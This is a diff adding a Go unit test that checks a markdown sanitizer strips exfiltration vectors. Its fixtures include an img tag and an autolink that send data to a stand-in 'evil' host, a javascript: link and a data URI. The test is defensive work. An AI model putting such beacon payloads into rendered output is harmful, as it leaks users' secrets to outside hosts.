@@ -66,6 +66,25 @@ func TestSanitizeMarkdownStripsImages(t *testing.T) {
 	}
 }
 
+func TestSanitizeMarkdownHardened(t *testing.T) {
+	cases := map[string]string{
+		"reference image": "look ![alt][1] here",
+		"raw img tag":     `<img src="http://evil/p?d=secret">`,
+		"autolink":        "beacon <http://evil/track>",
+		"javascript link": "[click me](javascript:steal())",
+		"data uri":        "[x](data:text/html;base64,PHN2Zz4=)",
+	}
+	for name, in := range cases {
+		out, n := SanitizeMarkdown(in)
+		if n == 0 {
+			t.Errorf("%s: nothing was stripped from %q", name, in)
+		}
+		if strings.Contains(out, "evil") || strings.Contains(strings.ToLower(out), "javascript:") || strings.Contains(strings.ToLower(out), "data:text") {
+			t.Errorf("%s: exfil vector survived: %q", name, out)
+		}
+	}
+}
+
 func TestInterpreterBlocksForbiddenSignature(t *testing.T) {
 	audit, verify := tempAudit(t)
 	// MicroVM must never be reached for a blocked command.
